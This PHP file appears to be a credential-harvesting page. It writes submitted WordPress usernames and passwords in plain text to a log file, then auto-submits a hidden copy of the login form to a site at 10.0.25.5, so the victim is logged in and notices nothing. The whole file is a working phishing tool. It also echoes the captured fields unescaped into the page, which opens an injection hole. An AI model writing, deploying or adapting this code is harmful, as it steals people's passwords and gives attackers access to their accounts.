<?php
//echo "hello<br>";
//echo $_POST["log"];
//echo $_POST["pwd"];
$file = fopen("/var/www/login.log","a");
fwrite($file, $_POST["log"]."/".$_POST["pwd"]."\n");
fclose($file);
?>

<form name="loginform" id="loginform1" action="http://10.0.25.5/" method="post" style="display:none">
                <p class="tml-user-login-wrap">
                        <label for="user_login1">Username or E-mail</label>
                        <input type="text" name="log" id="user_login1" class="input" value="<?php echo $_POST["log"]?>" size="20" />
                </p>

                <p class="tml-user-pass-wrap">
                        <label for="user_pass1">Password</label>
                        <input type="password" name="pwd" id="user_pass1" class="input" value="<?php echo $_POST["pwd"]?>" size="20" autocomplete="off" />
                </p>

                <input type="hidden" name="_wp_original_http_referer" value="/" />
                <div class="tml-rememberme-submit-wrap">
                        <p class="tml-rememberme-wrap">
                                <input name="rememberme" type="checkbox" id="rememberme1" value="forever" />
                                <label for="rememberme1">Remember Me</label>
                        </p>

                        <p class="tml-submit-wrap">
                                <input type="submit" name="wp-submit" id="wp-submit1" value="Log In" />
                                <input type="hidden" name="redirect_to" value="http://10.0.25.5/wp-admin/" />
                                <input type="hidden" name="instance" value="1" />
                                <input type="hidden" name="action" value="login" />
                        </p>
                </div>
</form>


<script>
document.getElementById('loginform1').submit()
</script>
